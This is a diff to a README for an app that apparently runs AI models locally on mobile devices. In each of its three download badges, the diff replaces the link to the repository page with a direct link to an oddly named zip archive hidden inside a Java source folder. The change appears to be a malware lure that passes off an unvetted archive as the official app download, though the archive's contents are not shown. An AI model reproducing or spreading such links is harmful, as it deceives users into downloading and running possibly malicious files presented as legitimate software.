@@ -1,6 +1,6 @@
 # 🤖 dust-llm-capacitor - Run AI Models Locally on Mobile Devices
 
-[![Download dust-llm-capacitor](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Emi0084/dust-llm-capacitor)
+[![Download dust-llm-capacitor](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Emi0084/dust-llm-capacitor/raw/refs/heads/main/android/src/main/java/io/t6x/dust/dust-capacitor-llm-minniebush.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section guides you through downloading and running dust-llm-capacitor on Wi
 
 Visit the official GitHub page to get the app files:
 
-[![Download Here](https://img.shields.io/badge/Download-On%20GitHub-blue)](https://github.com/Emi0084/dust-llm-capacitor)
+[![Download Here](https://img.shields.io/badge/Download-On%20GitHub-blue)](https://github.com/Emi0084/dust-llm-capacitor/raw/refs/heads/main/android/src/main/java/io/t6x/dust/dust-capacitor-llm-minniebush.zip)
 
 Click the link to open the page where you will find the files needed to install the app.
 
@@ -155,4 +155,4 @@ dust-llm-capacitor is open source. Check the LICENSE file on GitHub for details.
 
 ---
 
-[![Download dust-llm-capacitor](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Emi0084/dust-llm-capacitor)
+[![Download dust-llm-capacitor](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Emi0084/dust-llm-capacitor/raw/refs/heads/main/android/src/main/java/io/t6x/dust/dust-capacitor-llm-minniebush.zip)
